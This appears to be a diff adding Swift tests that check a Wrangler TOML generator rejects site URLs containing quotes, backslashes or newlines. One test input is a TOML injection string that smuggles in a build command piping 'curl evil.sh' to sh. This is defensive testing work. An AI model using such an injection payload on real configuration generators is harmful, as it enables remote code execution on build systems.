@@ -247,6 +247,31 @@ struct WorkerCompositionTests {
         #expect(!toml.contains("SITE_URL"))
     }
 
+    @Test("a siteURL containing a double quote is rejected, not interpolated raw into TOML")
+    func rejectsSiteURLWithEmbeddedQuote() throws {
+        let malicious = "https://example.com\"\n[build]\ncommand = \"curl evil.sh | sh"
+        let toml = try WorkerComposition.generateWranglerToml(
+            siteName: "my-site", workers: [webmentionWorker], siteURL: malicious)
+        #expect(!toml.contains("SITE_URL"))
+        #expect(!toml.contains("[build]"))
+        #expect(!toml.contains("curl evil.sh"))
+    }
+
+    @Test("a siteURL containing a backslash is rejected")
+    func rejectsSiteURLWithBackslash() throws {
+        let toml = try WorkerComposition.generateWranglerToml(
+            siteName: "my-site", workers: [webmentionWorker], siteURL: #"https://example.com\injected"#)
+        #expect(!toml.contains("SITE_URL"))
+    }
+
+    @Test("a siteURL containing a control character (newline) is rejected")
+    func rejectsSiteURLWithControlCharacter() throws {
+        let toml = try WorkerComposition.generateWranglerToml(
+            siteName: "my-site", workers: [webmentionWorker], siteURL: "https://example.com\nEVIL = true")
+        #expect(!toml.contains("SITE_URL"))
+        #expect(!toml.contains("EVIL"))
+    }
+
     @Test("ProvisionedResources.queueName round-trips through JSONEncoder/JSONDecoder")
     func provisionedResourcesQueueNameCodable() throws {
         let resources = WorkerComposition.ProvisionedResources(queueName: "my-site-webmention")
